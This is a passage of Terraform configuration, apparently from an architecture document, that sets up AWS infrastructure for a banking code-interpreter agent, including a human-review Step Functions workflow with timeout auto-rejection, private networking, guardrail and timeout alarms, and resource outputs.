# --- Step Functions: Human Review ---
resource "aws_sfn_state_machine" "human_review" {
  name     = "agent-human-review-${var.environment}"
  role_arn = aws_iam_role.sfn_role.arn

  definition = jsonencode({
    Comment = "Human-in-the-loop review for regulatory computations"
    StartAt = "NotifyReviewer"
    States = {
      NotifyReviewer = {
        Type     = "Task"
        Resource = "arn:aws:states:::sns:publish"
        Parameters = {
          TopicArn = aws_sns_topic.human_review.arn
          Message = {
            "Input.$" = "$"
          }
        }
        Next = "WaitForApproval"
      }
      WaitForApproval = {
        Type        = "Task"
        Resource    = "arn:aws:states:::sqs:receiveMessage.waitForTaskToken"
        HeartbeatSeconds = 86400  # 24h max wait
        Parameters = {
          QueueUrl = aws_sqs_queue.approval_queue.url
          "TaskToken.$" = "$$.Task.Token"
        }
        Next = "ProcessDecision"
        Catch = [{
          ErrorEquals = ["States.HeartbeatTimeout"]
          Next        = "AutoReject"
        }]
      }
      ProcessDecision = {
        Type = "Choice"
        Choices = [{
          Variable     = "$.approved"
          BooleanEquals = true
          Next          = "ApprovedExecution"
        }]
        Default = "RejectedNotification"
      }
      ApprovedExecution = {
        Type = "Succeed"
      }
      RejectedNotification = {
        Type = "Fail"
        Error = "HUMAN_REJECTED"
      }
      AutoReject = {
        Type = "Fail"
        Error = "TIMEOUT_AUTO_REJECT"
      }
    }
  })
}

# --- VPC (Private Networking for OpenSearch) ---
resource "aws_vpc" "agent_vpc" {
  cidr_block           = "10.10.0.0/16"
  enable_dns_hostnames = true
  enable_dns_support   = true
  tags = { Name = "agentcore-vpc-${var.environment}" }
}

resource "aws_opensearchserverless_vpc_endpoint" "main" {
  name               = "agentcore-memory-endpoint-${var.environment}"
  vpc_id             = aws_vpc.agent_vpc.id
  subnet_ids         = aws_subnet.private[*].id
  security_group_ids = [aws_security_group.opensearch.id]
}

# --- CloudWatch Alarms ---
resource "aws_cloudwatch_metric_alarm" "high_guardrail_hits" {
  alarm_name          = "agentcore-guardrail-hits-high-${var.environment}"
  comparison_operator = "GreaterThanThreshold"
  evaluation_periods  = 1
  metric_name         = "GuardrailInterventions"
  namespace           = "AWS/Bedrock/AgentCore"
  period              = 300
  statistic           = "Sum"
  threshold           = 10
  alarm_description   = "High guardrail intervention rate — possible adversarial activity"
  alarm_actions       = [aws_sns_topic.security_alerts.arn]
}

resource "aws_cloudwatch_metric_alarm" "execution_timeout_rate" {
  alarm_name          = "agentcore-execution-timeouts-${var.environment}"
  comparison_operator = "GreaterThanThreshold"
  evaluation_periods  = 2
  metric_name         = "CodeExecutionTimeouts"
  namespace           = "AWS/Bedrock/AgentCore"
  period              = 300
  statistic           = "Sum"
  threshold           = 5
  alarm_description   = "Code Interpreter execution timeout rate elevated"
  alarm_actions       = [aws_sns_topic.ops_alerts.arn]
}

# --- Outputs ---
output "agent_role_arn" {
  value       = aws_iam_role.agent_role.arn
  description = "IAM Role ARN for AgentCore Code Interpreter agent"
}

output "s3_output_bucket" {
  value       = aws_s3_bucket.agent_outputs.id
  description = "S3 bucket for agent outputs and checkpoints"
}

output "kms_key_id" {
  value       = aws_kms_key.agent_data.key_id
  description = "KMS key ID for data encryption"
  sensitive   = true
}

output "opensearch_endpoint" {
  value       = aws_opensearchserverless_collection.long_term_memory.collection_endpoint
  description = "OpenSearch Serverless endpoint for long-term memory"
}

output "guardrail_id" {
  value       = aws_bedrock_guardrail.banking_guardrail.guardrail_id
  description = "Bedrock Guardrail ID"
}

output "human_review_sfn_arn" {
  value       = aws_sfn_state_machine.human_review.arn
  description = "Step Functions ARN for human review workflow"
}
```

## Related

- [Bedrock AgentCore Code Interpreter Architecture](../19-bedrock-agentcore-code-interpreter-architecture.md) — executive summary, logical architecture, session model
- [Bedrock AgentCore Code Interpreter Architecture (Part 5)](19-bedrock-agentcore-code-interpreter-architecture-part5.md) — best practices, risks & trade-offs, project roadmap, evaluation framework, ADRs
